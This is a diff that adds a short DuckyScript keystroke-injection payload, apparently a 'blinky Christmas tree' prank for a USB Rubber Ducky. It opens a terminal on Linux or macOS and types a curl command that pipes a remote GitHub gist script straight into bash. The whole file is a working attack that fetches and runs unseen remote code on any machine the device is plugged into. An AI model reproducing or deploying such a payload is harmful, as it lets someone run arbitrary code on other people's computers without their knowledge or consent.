@@ -1,0 +1,17 @@
+REM Blinky tree by Landsil
+
+DELAY 1000
+REM --------------- Try Linux ---------------
+ALT F2
+DELAY 200
+REM --------------- Try Mac ---------------
+GUI SPACE
+DELAY 200
+REM --------------- Load code ---------------
+STRING terminal
+DELAY 250
+ENTER
+DELAY 250
+
+STRING curl https://gist.githubusercontent.com/Landsil/81209a90884284d2356fc311ef67e5b6/raw/c40001ad2703edc1cd572fa4531e5f33e159013b/christmas_tree.sh | bash
+ENTER
